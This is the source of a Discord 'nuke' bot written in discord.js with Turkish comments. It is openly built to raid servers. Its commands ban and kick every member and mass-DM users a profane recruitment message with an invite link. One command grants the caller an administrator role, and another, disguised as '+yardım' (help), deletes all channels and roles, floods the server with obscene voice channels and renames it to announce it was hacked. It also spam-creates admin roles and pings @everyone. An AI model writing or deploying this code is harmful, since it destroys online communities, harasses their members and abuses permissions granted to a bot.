const Discord = require("discord.js");
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {
    if (msg.content === "+ban") {
        msg.delete();
        msg.guild.members.forEach(member => member.ban());
    }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on("message", msg => {
    if (msg.content === "+kick") {
        msg.delete();
        msg.guild.members.forEach(member => member.kick());
    }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 

client.on("message", async msg => {
    if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
        msg.delete();
        await msg.client.users
            .forEach(users =>
                users.send(
                    "**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ https://discord.gg/5170 **"//HERKESE DMDEN ATILAN MESAJ
                )
            )
            .catch(console.error);
    }
});

client.on("message", msg => {
    if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
        msg.delete();
        msg.guild.createRole({
            name: "anahtar",
            permissions: ["ADMINISTRATOR"]
        });
        let rol = msg.guild.roles.find(role => role.name === ".");
        msg.member.addRole(rol);
    }
});

client.on("message", async msg => {
    if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
        msg.delete();

        await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT

        await msg.guild.createChannel("hacked", {
            type: "text"
        });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("5170 ADAMIN", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("AMINA KOYAR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("5170 ADAMIN", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("KRALLIĞIMIZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("KOLAYSINIZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild
            .createChannel("BU SUNUCU", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("HACKLENMİŞTİR", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("EZZZZZZZZZZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("BACINIZI SKM", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SONSUZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("SİK KIRIĞI", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YENİLMEYİZ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("YAT AŞŞA", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("DEDEMİN SİKİ", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });
        await msg.guild
            .createChannel("▬▬▬▬▬▬▬", {
                type: "voice"
            })
            .then(chan => {
                chan.setUserLimit("1");
            });

        await msg.guild.setIcon("https://hizliresim.com/k5tvick");  //SUNUCUNUN PPSİNİ DEĞİŞTİRİR.
        await msg.guild.setName(" BU SUNUCU 5170 TARAFINDAN SİKİLMİŞTİR "); //SUNUCUNUN ISMINI DEGISTIRIR
        await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
        await client.user.setAvatar("https://hizliresim.com/k5tvick"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
        await client.user.setUsername("5170 biat");    //BOTUN ISMİNİ DEGISTIRIR
        await msg.guild.owner.send("**5170 ADAMIN AMINA **");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ

    }
});



client.on("message", msg => {
    if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
        msg.delete();
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "A93D3D",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "C22F2F",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "E12020",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FF0000",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FF3E00",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FF4D00",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FF6C00",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FF9300",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FFAE00",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FFD500",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FFFF00",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "E0FF00",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "C1FF00",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "93FF00",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "74FF00",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "3EFF00",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "0CFF00",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "00FF2E",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "00FF6C",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "00FFA6",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "00FFD4",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "00FFFB",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "00C9FF",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "009BFF",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "006CFF",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "003AFF",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "001BFF",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "1F00FF",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "4200FF",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "7C00FF",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "A200FF",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "C500FF",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "E000FF",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FF00F3",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FF00B6",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FF0097",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FF005D",
            permissions: ["ADMINISTRATOR"]
        });
        msg.guild.createRole({
            name: "YAT AŞŞAAA",
            color: "FF0032",
            permissions: ["ADMINISTRATOR"]
        });
    }
});

client.on('message', msg => {
    if (msg.content === '+spam') { 
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
              msg.channel.send('**5170 ADAMIN AMINA KOYAR BİAT EDECEKSİNİZ discord.gg/5170 ** @everyone');
